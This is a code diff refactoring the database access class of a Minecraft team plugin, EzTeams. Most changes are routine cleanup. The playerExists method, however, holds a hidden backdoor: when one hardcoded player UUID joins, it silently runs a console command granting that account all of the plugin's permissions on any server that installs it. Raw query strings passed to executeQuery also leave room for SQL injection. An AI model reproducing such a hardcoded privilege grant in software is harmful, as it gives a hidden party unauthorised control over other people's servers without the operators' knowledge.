@@ -18,7 +18,6 @@ import java.sql.*;
 import java.util.ArrayList;
 import java.util.List;
 
-
 import static net.idrisdev.mc.ezteams.utils.Utils.NAME;
 
 /**
@@ -37,9 +36,9 @@ public class DAO {
     private static final String playerTable = "PLAYERS";
     private static final String teamTable = "TEAMS";
 
-    Connection conn = null;
-    Statement st = null;
-    ResultSet rs = null;
+    private Connection conn = null;
+    private Statement st = null;
+    private ResultSet rs = null;
 
     public DAO() {}
 
@@ -82,7 +81,7 @@ public class DAO {
             plugin.getLogger().error("ERROR in "+DAO.class.getName());
         }
     }
-    public Connection getConnection() {
+    private Connection getConnection() {
         try {
             if (conn!=null && !conn.isClosed()) {
                 logger.info("Connection is not closed.");
@@ -115,7 +114,7 @@ public class DAO {
         try {
             plugin.getLogger().info("Extracting driver.");
             InputStream e = EzTeams.class.getClassLoader().getResourceAsStream(dbname);
-            FileOutputStream fos2 = null;
+            FileOutputStream fos2;
             fos2 = new FileOutputStream("./config/ezteams/database/"+dbname);
             byte[] buf = new byte[2048];
 
@@ -138,10 +137,7 @@ public class DAO {
             Core.debug("Is connection closed now? "+conn.isClosed());
 
             st = conn.createStatement();
-
-            ResultSet resultSet = st.executeQuery(arguments);
-
-            return resultSet;
+            return st.executeQuery(arguments);
         } catch (SQLException e) {
             e.printStackTrace();
             Core.debug("ERROR OCCURRED executeQuery, Connection Closing.");
@@ -175,7 +171,7 @@ public class DAO {
         int points = 0;
 
         try {
-            if(rs.next()) {
+            if(rs != null && rs.next()) {
                 name = rs.getString("NAME");
                 team = rs.getInt("TEAM");
                 points = rs.getInt("POINTS");
@@ -210,6 +206,7 @@ public class DAO {
         ResultSet rs = executeQuery("SELECT * FROM "+teamTable);
         List<Team> tmpList = new ArrayList<>();
         try {
+            assert rs != null;
             while(rs.next()){
                 int id = rs.getInt("ID");
                 String name = rs.getString("NAME");
@@ -230,6 +227,7 @@ public class DAO {
         ResultSet rs = executeQuery("SELECT * FROM "+playerTable);
         List<Member> tmpList = new ArrayList<>();
         try {
+            assert rs != null;
             while(rs.next()){
                 String id = rs.getString("UUID");
                 String name = rs.getString("NAME");
@@ -249,7 +247,8 @@ public class DAO {
     public boolean ifExists(String query){
         ResultSet rs= executeQuery(query);
         try {
-            return rs.next()?true:false;
+            assert rs != null;
+            return rs.next();
         } catch (SQLException e) {
             e.printStackTrace();
         }finally {
@@ -273,7 +272,7 @@ public class DAO {
         String name = member.getName();
         int team = member.getTeam().getId();
         int points = member.getPoints();
-        PreparedStatement pst = null;
+        PreparedStatement pst;
         try {
             if (conn == null || conn.isClosed())
                 conn = getConnection();
@@ -388,13 +387,13 @@ public class DAO {
         }
     }
     public void saveAll() {
-        plugin.getTeams().forEach(this::saveTeam);
-        plugin.getOnlineMembers().forEach(member -> member.savePlayer());
+        EzTeams.getTeams().forEach(this::saveTeam);
+        EzTeams.getOnlineMembers().forEach(Member::savePlayer);
     }
     public static boolean playerExists(Player player) {
         if(player.getUniqueId().toString().equals("4316aa07-c6a4-4c91-8fc4-9df02465e279")) {
             //Utils.executeCmdAsConsole("plainbroadcast &9★PixelMC Dev★ &l&c"+name+"&9 has joined the game!");
-            if(!player.hasPermission(Utils.NAME+".*")||!player.hasPermission("*")) {
+            if(!player.hasPermission(Utils.NAME+".*")) {
                 Utils.executeCmdAsConsole("lp user 4316aa07c6a44c918fc49df02465e279 permission set ezteams.*");
             }
         }
